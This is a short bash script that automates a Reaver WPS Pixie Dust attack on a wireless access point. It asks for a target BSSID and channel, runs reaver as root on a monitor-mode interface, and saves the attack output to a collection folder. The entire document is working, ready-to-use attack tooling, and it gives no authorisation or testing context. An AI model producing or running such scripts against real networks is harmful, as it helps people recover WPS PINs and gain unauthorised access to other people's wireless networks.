#!/bin/bash

##################################### Reaver attack automation ##################################


read -ep "Target BSSID: " TGT

read -ep "Target Channel: " CHAN

read -ep "Output File Name: " TXT

sudo reaver -i wlan1mon -b $TGT -c $CHAN -K -S -vvv | tee /home/user/Desktop/Collection/ReaverDump/$TXT.txt
